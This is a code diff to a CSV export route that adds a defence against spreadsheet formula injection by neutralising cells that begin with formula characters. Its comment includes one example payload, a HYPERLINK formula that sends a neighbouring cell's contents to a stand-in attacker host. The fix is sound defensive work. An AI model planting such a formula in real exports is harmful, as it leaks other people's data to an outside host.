@@ -37,8 +37,19 @@ export async function GET(request: NextRequest) {
   })
 }
 
+// Quoting alone isn't enough. A cell that opens with =, +, - or @ is read as a
+// FORMULA by Excel, Sheets and Numbers, quoted or not - so a message body of
+// `=HYPERLINK("https://evil.example/?"&A1,"Click")` runs the moment an admin
+// opens the export, exfiltrating the row it sits next to. The message text is
+// written by an unauthenticated stranger, so neutralise the lead character by
+// prefixing a single quote, which spreadsheets treat as "this is text".
+// (Tab and carriage return are included: both are also treated as formula leads.)
+function neutraliseFormula(str: string): string {
+  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str
+}
+
 function csvEscape(value: string): string {
-  const str = String(value)
+  const str = neutraliseFormula(String(value))
   if (str.includes(',') || str.includes('"') || str.includes('\n')) {
     return `"${str.replace(/"/g, '""')}"`
   }
